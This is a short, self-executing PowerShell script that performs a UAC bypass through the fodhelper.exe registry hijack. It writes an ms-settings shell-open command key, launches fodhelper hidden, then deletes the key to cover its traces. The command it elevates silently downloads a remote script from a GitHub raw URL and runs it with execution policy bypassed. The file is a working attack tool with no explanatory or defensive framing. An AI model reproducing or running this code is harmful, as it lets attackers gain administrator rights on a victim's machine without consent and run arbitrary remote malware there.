function ffv(){ 
 Param (
           
        [String]$program = "cmd /c powershell -nop -W hidden -noni -ep bypass -c 'iex (irm https://raw.githubusercontent.com/petergriuffin123/565/refs/heads/main/f.ps1)'"
       )
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
ffv
